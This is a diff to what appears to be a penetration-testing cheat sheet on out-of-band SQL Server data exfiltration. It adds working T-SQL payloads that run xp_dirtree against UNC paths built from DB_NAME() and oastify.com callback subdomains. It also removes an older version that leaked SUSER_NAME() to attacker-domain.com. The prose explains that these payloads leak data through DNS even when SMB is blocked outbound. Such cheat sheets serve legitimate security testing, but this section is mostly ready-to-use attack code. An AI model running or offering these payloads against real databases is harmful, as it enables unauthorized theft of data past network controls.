@@ -274,9 +274,16 @@ EXEC('master..xp_dirtree "\\' + @data + '.attacker-ip\share"');
 #### DNS-based exfiltration
 Same principle, but resolved via `xp_dirtree`/`xp_fileexist`/`xp_subdirs` pointed at a domain you control instead of a raw IP — works even when SMB (port 445) is blocked outbound but DNS isn't:
 ```sql
+DECLARE @data VARCHAR(1024) = REPLACE(DB_NAME(), '\', '-');
+DECLARE @cmd VARCHAR(2000) = 'master..xp_dirtree "\\' + @data + '.kymlntxf88mcrsbwonrwttr4svymmca1.oastify.com\share"';
+EXEC(@cmd);
+```
+```sql
 DECLARE @data VARCHAR(1024);
-SELECT @data = (SELECT SUSER_NAME());
-EXEC('master..xp_dirtree "\\' + @data + '.attacker-domain.com\share"');
+SELECT @data = REPLACE((SELECT DB_NAME()),'\', '-');
+DECLARE @cmd VARCHAR(2000) = 'master..xp_dirtree "\\' + @data + '.qtnrizsl3ehimy62jtm2ozman1tshl5a.oastify.com\share"';
+PRINT @cmd;
+EXEC(@cmd);
 ```
 This causes the server to attempt DNS resolution of `<stolen-data>.attacker-domain.com`, which shows up as a query on your authoritative DNS server/listener — no SMB traffic required.
  
